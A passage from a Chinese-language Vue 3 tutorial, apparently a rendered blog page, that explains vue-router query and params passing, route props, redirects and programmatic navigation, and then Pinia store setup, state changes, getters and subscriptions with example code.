class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 跳转并携带query参数（to的字符串写法） --&gt;</span><br><span class="line">&lt;router-link to=&quot;/news/detail?a=1&amp;b=2&amp;content=欢迎你&quot;&gt;</span><br><span class="line">跳转</span><br><span class="line">&lt;/router-link&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 跳转并携带query参数（to的对象写法） --&gt;</span><br><span class="line">&lt;RouterLink </span><br><span class="line">  :to=&quot;&#123;</span><br><span class="line">    //name:&#x27;xiang&#x27;, //用name也可以跳转</span><br><span class="line">    path:&#x27;/news/detail&#x27;,</span><br><span class="line">    query:&#123;</span><br><span class="line">      id:news.id,</span><br><span class="line">      title:news.title,</span><br><span class="line">      content:news.content</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;&quot;</span><br><span class="line">&gt;</span><br><span class="line">  &#123;&#123;news.title&#125;&#125;</span><br><span class="line">&lt;/RouterLink&gt;</span><br></pre></td></tr></table></figure></li><li><p>接收参数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;useRoute&#125; <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="keyword">const</span> route = <span class="title function_">useRoute</span>()</span><br><span class="line"><span class="comment">// 打印query参数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(route.<span class="property">query</span>)</span><br></pre></td></tr></table></figure></li></ol><h3 id="params参数">params参数</h3><ol><li><p>传递参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 跳转并携带params参数（to的字符串写法） --&gt;</span><br><span class="line">&lt;RouterLink :to=&quot;`/news/detail/001/新闻001/内容001`&quot;&gt;&#123;&#123;news.title&#125;&#125;&lt;/RouterLink&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 跳转并携带params参数（to的对象写法） --&gt;</span><br><span class="line">&lt;RouterLink </span><br><span class="line">  :to=&quot;&#123;</span><br><span class="line">    name:&#x27;xiang&#x27;, //用name跳转</span><br><span class="line">    params:&#123;</span><br><span class="line">      id:news.id,</span><br><span class="line">      title:news.title,</span><br><span class="line">      content:news.title</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;&quot;</span><br><span class="line">&gt;</span><br><span class="line">  &#123;&#123;news.title&#125;&#125;</span><br><span class="line">&lt;/RouterLink&gt;</span><br></pre></td></tr></table></figure></li><li><p>接收参数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;useRoute&#125; <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="keyword">const</span> route = <span class="title function_">useRoute</span>()</span><br><span class="line"><span class="comment">// 打印params参数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(route.<span class="property">params</span>)</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>备注1：传递<code>params</code>参数时，若使用<code>to</code>的对象写法，必须使用<code>name</code>配置项，不能用<code>path</code>。</p><p>备注2：传递<code>params</code>参数时，需要提前在规则中占位。</p></blockquote><h2 id="4-9-【路由的props配置】">4.9. 【路由的props配置】</h2><p>作用：让路由组件更方便的收到参数（可以将路由参数作为<code>props</code>传给组件）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;xiang&#x27;</span>,</span><br><span class="line"><span class="attr">path</span>:<span class="string">&#x27;detail/:id/:title/:content&#x27;</span>,</span><br><span class="line"><span class="attr">component</span>:<span class="title class_">Detail</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// props的对象写法，作用：把对象中的每一组key-value作为props传给Detail组件</span></span><br><span class="line">  <span class="comment">// props:&#123;a:1,b:2,c:3&#125;, </span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// props的布尔值写法，作用：把收到了每一组params参数，作为props传给Detail组件</span></span><br><span class="line">  <span class="comment">// props:true</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// props的函数写法，作用：把返回的对象中每一组key-value作为props传给Detail组件</span></span><br><span class="line">  <span class="title function_">props</span>(<span class="params">route</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> route.<span class="property">query</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-10-【-replace属性】">4.10. 【 replace属性】</h2><ol><li><p>作用：控制路由跳转时操作浏览器历史记录的模式。</p></li><li><p>浏览器的历史记录有两种写入方式：分别为<code>push</code>和<code>replace</code>：</p><ul><li><code>push</code>是追加历史记录（默认值）。</li><li><code>replace</code>是替换当前记录。</li></ul></li><li><p>开启<code>replace</code>模式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;RouterLink replace .......&gt;News&lt;/RouterLink&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="4-11-【编程式导航】">4.11. 【编程式导航】</h2><p>路由组件的两个重要的属性：<code>$route</code>和<code>$router</code>变成了两个<code>hooks</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;useRoute,useRouter&#125; <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> route = <span class="title function_">useRoute</span>()</span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">useRouter</span>()</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(route.<span class="property">query</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(route.<span class="property">parmas</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(router.<span class="property">push</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(router.<span class="property">replace</span>)</span><br></pre></td></tr></table></figure><h2 id="4-12-【重定向】">4.12. 【重定向】</h2><ol><li><p>作用：将特定的路径，重新定向到已有路由。</p></li><li><p>具体编码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">path</span>:<span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="attr">redirect</span>:<span class="string">&#x27;/about&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1>5. pinia</h1><h2 id="5-1【准备一个效果】">5.1【准备一个效果】</h2><img src="./images/pinia_example.gif" alt="pinia_example" style="zoom:30%;border:3px solid" /> <h2 id="5-2【搭建-pinia-环境】">5.2【搭建 pinia 环境】</h2><p>第一步：<code>npm install pinia</code></p><p>第二步：操作<code>src/main.ts</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 引入createPinia，用于创建pinia */</span></span><br><span class="line"><span class="keyword">import</span> &#123; createPinia &#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 创建pinia */</span></span><br><span class="line"><span class="keyword">const</span> pinia = <span class="title function_">createPinia</span>()</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 使用插件 */</span>&#123;&#125;</span><br><span class="line">app.<span class="title function_">use</span>(pinia)</span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><p>此时开发者工具中已经有了<code>pinia</code>选项</p><img src="https://cdn.nlark.com/yuque/0/2023/png/35780599/1684309952481-c67f67f9-d1a3-4d69-8bd6-2b381e003f31.png" style="zoom:80%;border:1px solid black;border-radius:10px" /><h2 id="5-3【存储-读取数据】">5.3【存储+读取数据】</h2><ol><li><p><code>Store</code>是一个保存：<strong>状态</strong>、<strong>业务逻辑</strong> 的实体，每个组件都可以<strong>读取</strong>、<strong>写入</strong>它。</p></li><li><p>它有三个概念：<code>state</code>、<code>getter</code>、<code>action</code>，相当于组件中的： <code>data</code>、 <code>computed</code> 和 <code>methods</code>。</p></li><li><p>具体编码：<code>src/store/count.ts</code></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入defineStore用于创建store</span></span><br><span class="line"><span class="keyword">import</span> &#123;defineStore&#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义并暴露一个store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useCountStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;count&#x27;</span>,&#123;</span><br><span class="line">  <span class="comment">// 动作</span></span><br><span class="line">  <span class="attr">actions</span>:&#123;&#125;,</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  <span class="title function_">state</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">sum</span>:<span class="number">6</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 计算</span></span><br><span class="line">  <span class="attr">getters</span>:&#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>具体编码：<code>src/store/talk.ts</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入defineStore用于创建store</span></span><br><span class="line"><span class="keyword">import</span> &#123;defineStore&#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义并暴露一个store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useTalkStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;talk&#x27;</span>,&#123;</span><br><span class="line">  <span class="comment">// 动作</span></span><br><span class="line">  <span class="attr">actions</span>:&#123;&#125;,</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  <span class="title function_">state</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">talkList</span>:[</span><br><span class="line">        &#123;<span class="attr">id</span>:<span class="string">&#x27;yuysada01&#x27;</span>,<span class="attr">content</span>:<span class="string">&#x27;你今天有点怪，哪里怪？怪好看的！&#x27;</span>&#125;,</span><br><span class="line">     &#123;<span class="attr">id</span>:<span class="string">&#x27;yuysada02&#x27;</span>,<span class="attr">content</span>:<span class="string">&#x27;草莓、蓝莓、蔓越莓，你想我了没？&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="attr">id</span>:<span class="string">&#x27;yuysada03&#x27;</span>,<span class="attr">content</span>:<span class="string">&#x27;心里给你留了一块地，我的死心塌地&#x27;</span>&#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 计算</span></span><br><span class="line">  <span class="attr">getters</span>:&#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>组件中使用<code>state</code>中的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;h2&gt;当前求和为：&#123;&#123; sumStore.sum &#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Count&quot;&gt;</span><br><span class="line">  // 引入对应的useXxxxxStore</span><br><span class="line">  import &#123;useSumStore&#125; from &#x27;@/store/sum&#x27;</span><br><span class="line">  </span><br><span class="line">  // 调用useXxxxxStore得到对应的store</span><br><span class="line">  const sumStore = useSumStore()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li v-for=&quot;talk in talkStore.talkList&quot; :key=&quot;talk.id&quot;&gt;</span><br><span class="line">      &#123;&#123; talk.content &#125;&#125;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Count&quot;&gt;</span><br><span class="line">  import axios from &#x27;axios&#x27;</span><br><span class="line">  import &#123;useTalkStore&#125; from &#x27;@/store/talk&#x27;</span><br><span class="line"></span><br><span class="line">  const talkStore = useTalkStore()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="5-4-【修改数据】-三种方式">5.4.【修改数据】(三种方式)</h2><ol><li><p>第一种修改方式，直接修改</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">countStore.<span class="property">sum</span> = <span class="number">666</span></span><br></pre></td></tr></table></figure></li><li><p>第二种修改方式：批量修改</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">countStore.$patch(&#123;</span><br><span class="line">  <span class="attr">sum</span>:<span class="number">999</span>,</span><br><span class="line">  <span class="attr">school</span>:<span class="string">&#x27;atguigu&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>第三种修改方式：借助<code>action</code>修改（<code>action</code>中可以编写一些业务逻辑）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineStore &#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useCountStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;count&#x27;</span>, &#123;</span><br><span class="line">  <span class="comment">/*************/</span></span><br><span class="line">  <span class="attr">actions</span>: &#123;</span><br><span class="line">    <span class="comment">//加</span></span><br><span class="line">    <span class="title function_">increment</span>(<span class="params">value:number</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">sum</span> &lt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="comment">//操作countStore中的sum</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">sum</span> += value</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//减</span></span><br><span class="line">    <span class="title function_">decrement</span>(<span class="params">value:number</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">sum</span> &gt; <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">sum</span> -= value</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/*************/</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>组件中调用<code>action</code>即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用countStore</span></span><br><span class="line"><span class="keyword">const</span> countStore = <span class="title function_">useCountStore</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用对应action</span></span><br><span class="line">countStore.<span class="title function_">incrementOdd</span>(n.<span class="property">value</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="5-5-【storeToRefs】">5.5.【storeToRefs】</h2><ul><li>借助<code>storeToRefs</code>将<code>store</code>中的数据转为<code>ref</code>对象，方便在模板中使用。</li><li>注意：<code>pinia</code>提供的<code>storeToRefs</code>只会将数据做转换，而<code>Vue</code>的<code>toRefs</code>会转换<code>store</code>中数据。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;count&quot;&gt;</span><br><span class="line">&lt;h2&gt;当前求和为：&#123;&#123;sum&#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Count&quot;&gt;</span><br><span class="line">  import &#123; useCountStore &#125; from &#x27;@/store/count&#x27;</span><br><span class="line">  /* 引入storeToRefs */</span><br><span class="line">  import &#123; storeToRefs &#125; from &#x27;pinia&#x27;</span><br><span class="line"></span><br><span class="line">/* 得到countStore */</span><br><span class="line">  const countStore = useCountStore()</span><br><span class="line">  /* 使用storeToRefs转换countStore，随后解构 */</span><br><span class="line">  const &#123;sum&#125; = storeToRefs(countStore)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-6-【getters】">5.6.【getters】</h2><ol><li><p>概念：当<code>state</code>中的数据，需要经过处理后再使用时，可以使用<code>getters</code>配置。</p></li><li><p>追加<code>getters</code>配置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入defineStore用于创建store</span></span><br><span class="line"><span class="keyword">import</span> &#123;defineStore&#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义并暴露一个store</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useCountStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;count&#x27;</span>,&#123;</span><br><span class="line">  <span class="comment">// 动作</span></span><br><span class="line">  <span class="attr">actions</span>:&#123;</span><br><span class="line">    <span class="comment">/************/</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 状态</span></span><br><span class="line">  <span class="title function_">state</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">sum</span>:<span class="number">1</span>,</span><br><span class="line">      <span class="attr">school</span>:<span class="string">&#x27;atguigu&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 计算</span></span><br><span class="line">  <span class="attr">getters</span>:&#123;</span><br><span class="line">    <span class="attr">bigSum</span>:(state):<span class="function"><span class="params">number</span> =&gt;</span> state.<span class="property">sum</span> *<span class="number">10</span>,</span><br><span class="line">    <span class="title function_">upperSchool</span>():string&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>. school.<span class="title function_">toUpperCase</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>组件中读取数据：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;increment,decrement&#125; = countStore</span><br><span class="line"><span class="keyword">let</span> &#123;sum,school,bigSum,upperSchool&#125; = <span class="title function_">storeToRefs</span>(countStore)</span><br></pre></td></tr></table></figure></li></ol><h2 id="5-7-【-subscribe】">5.7.【$subscribe】</h2><p>通过 store 的 <code>$subscribe()</code> 方法侦听 <code>state</code> 及其变化</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">talkStore.$subscribe(<span class="function">(<span class="params">mutate,state</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;LoveTalk&#x27;</span>,mutate,state)</span><br><span class="line">  <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;talk&#x27;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(talkList.<span class="property">value</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="5-8-【store组合式写法】">5.8. 【store组合式写法】</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;defineStore&#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;nanoid&#125; <span class="keyword">from</span> <span class="string">&#x27;nanoid&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;reactive&#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useTalkStore = <span class="title function_">defineStore</span>(<span class="string">&#x27;talk&#x27;</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">  <span class="comment">// talkList就是state</span></span><br><span class="line">  <span class="keyword">const</span> talkList = <span class="title function_">reactive</span>(</span><br><span class="line">    <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;talkList&#x27;</span>) <span class="keyword">as</span> <span class="built_in">string</span>) || []</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="comment">// getATalk函数相当于action</span></span><br><span class="line">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getATalk</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 发请求，下面这行的写法是：连续解构赋值+重命名</span></span><br><span class="line">    <span class="keyword">let</span> &#123;<span class="attr">data</span>:&#123;<span class="attr">content</span>:title&#125;&#125; = <span class="keyword">await</span> axios.<span class="title function_">get</span>(<span class="string">&#x27;https://api.uomg.com/api/rand.qinghua?format=json&#x27;</span>)</span><br><span class="line">    <span class="comment">// 把请求回来的字符串，包装成一个对象</span></span><br><span class="line">    <span class="keyword">let</span> obj = &#123;<span class="attr">id</span>:<span class="title function_">nanoid</span>(),title&#125;</span><br><span class="line">    <span class="comment">// 放到数组中</span></span><br><span class="line">    talkList.<span class="title function_">unshift</span>(obj)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;talkList,getATalk&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1>6. 组件通信</h1><p><strong><code>Vue3</code>组件通信和<code>Vue2</code>的区别：</strong></p><ul><li>移出事件总线，使用<code>mitt</code>代替。</li></ul><ul><li><code>vuex</code>换成了<code>pinia</code>。</li><li>把<code>.sync</code>优化到了<code>v-model</code>里面了。</li><li>把<code>$listeners</code>所有的东西，合并到<code>$attrs</code>中了。</li><li><code>$children</code>被砍掉了。</li></ul><p><strong>常见搭配形式：</strong></p><img src="images/image-20231119185900990.png" alt="image-20231119185900990" style="zoom:60%;" /> <h2 id="6-1-【props】">6.1. 【props】</h2><p>概述：<code>props</code>是使用频率最高的一种通信方式，常用与 ：<strong>父 ↔ 子</strong>。</p><ul><li>若 <strong>父传子</strong>：属性值是<strong>非函数</strong>。</li><li>若 <strong>子传父</strong>：属性值是<strong>函数</strong>。</li></ul><p>父组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;father&quot;&gt;</span><br><span class="line">    &lt;h3&gt;父组件，&lt;/h3&gt;</span><br><span class="line">&lt;h4&gt;我的车：&#123;&#123; car &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;儿子给的玩具：&#123;&#123; toy &#125;&#125;&lt;/h4&gt;</span><br><span 